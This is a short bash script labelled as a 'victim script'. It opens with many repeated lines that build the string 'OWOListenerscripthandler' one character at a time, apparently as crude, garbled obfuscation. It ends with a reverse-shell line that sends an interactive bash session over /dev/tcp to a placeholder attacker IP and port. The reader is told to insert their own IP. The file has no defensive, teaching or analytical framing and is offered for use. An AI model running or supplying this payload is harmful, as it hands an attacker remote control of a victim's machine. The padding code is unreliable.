
v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"
v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"
v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"
v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"v=$(echo "O")v+="W"v+="O"v+="L"v+="i"v+="s"v+="t"v+="e"v+="n"v+="e"v+="r"
v+="s"v+="c"v+="r"v+="i"v+="p"v+="t"v+="h"v+="a"v+="n"v+="d"
v+="l"v+="e"v+="r"

v=$v$v$v$v$v$v$v$v$v$v$v$v$v

#!/bin/bash
# Victim script (run on the victim's machine)
# Replace attacker_ip with your ip adress

ATTACKER_IP="attacker_ip_here"
PORT=8080

bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1